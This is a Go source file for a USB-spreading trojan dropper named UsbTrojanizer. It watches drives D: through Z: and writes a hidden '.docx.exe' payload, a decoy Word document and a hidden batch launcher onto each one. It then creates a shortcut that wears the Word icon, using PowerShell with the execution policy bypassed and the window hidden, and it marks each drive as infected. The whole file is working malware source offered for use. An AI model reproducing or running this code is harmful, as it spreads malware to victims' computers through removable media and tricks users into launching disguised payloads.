package enrif

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

func UsbTrojanizer(payloadData []byte, docData []byte, fileBaseName string, durationSeconds int) string {
	var output string
	startDrives := listDrives()
	start := time.Now()

	output += "[*] Start to monitor USB\n"

	for _, d := range startDrives {
		if !isAlreadyInfected(d) {
			output += fmt.Sprintf("[+] Infecting existing drive: %s\n", d)
			infectDrive(d, fileBaseName, payloadData, docData)
			markInfected(d)
		}
	}

	for {
		if time.Since(start).Seconds() >= float64(durationSeconds) {
			output += "[*] USB monitoring finished.\n"
			return output
		}

		currentDrives := listDrives()
		for _, d := range currentDrives {
			if !contains(startDrives, d) && !isAlreadyInfected(d) {
				output += fmt.Sprintf("[+] New USB detected: %s\n", d)
				infectDrive(d, fileBaseName, payloadData, docData)
				markInfected(d)
			}
		}

		time.Sleep(2 * time.Second)
	}
}

func infectDrive(drive string, name string, payloadData, docData []byte) {
	payloadPath := filepath.Join(drive, name+".docx.exe")
	docPath := filepath.Join(drive, name+".docx")
	batPath := filepath.Join(drive, name+".docx.bat")
	lnkPath := filepath.Join(drive, name+".docx.lnk")

	// Write files
	_ = os.WriteFile(payloadPath, payloadData, 0644)
	hideFile(payloadPath)

	_ = os.WriteFile(docPath, docData, 0644)
	hideFile(docPath)

	batContent := fmt.Sprintf(`@echo off
start "" "%s"
start "" "%s"
exit
`, name+".docx.exe", name+".docx")
	_ = os.WriteFile(batPath, []byte(batContent), 0644)
	hideFile(batPath)

	createLNKShortcut(batPath, lnkPath)

	fmt.Println("[+] USB infected with", name)
}

func createLNKShortcut(targetBAT, shortcutLNK string) {
	psScript := fmt.Sprintf(`$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.IconLocation='C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE';$s.Save()`, shortcutLNK, targetBAT)
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func hideFile(path string) {
	_ = syscall.SetFileAttributes(syscall.StringToUTF16Ptr(path), syscall.FILE_ATTRIBUTE_HIDDEN)
}

func listDrives() []string {
	drives := []string{}
	for c := 'D'; c <= 'Z'; c++ {
		path := fmt.Sprintf("%c:\\", c)
		if _, err := os.Stat(path); err == nil {
			drives = append(drives, path)
		}
	}
	return drives
}

func contains(list []string, item string) bool {
	for _, v := range list {
		if v == item {
			return true
		}
	}
	return false
}

func isAlreadyInfected(drive string) bool {
	marker := filepath.Join(drive, ".infected_marker")
	_, err := os.Stat(marker)
	return err == nil
}

func markInfected(drive string) {
	marker := filepath.Join(drive, ".infected_marker")
	_ = os.WriteFile(marker, []byte("INFECTED"), 0644)
	hideFile(marker)
}
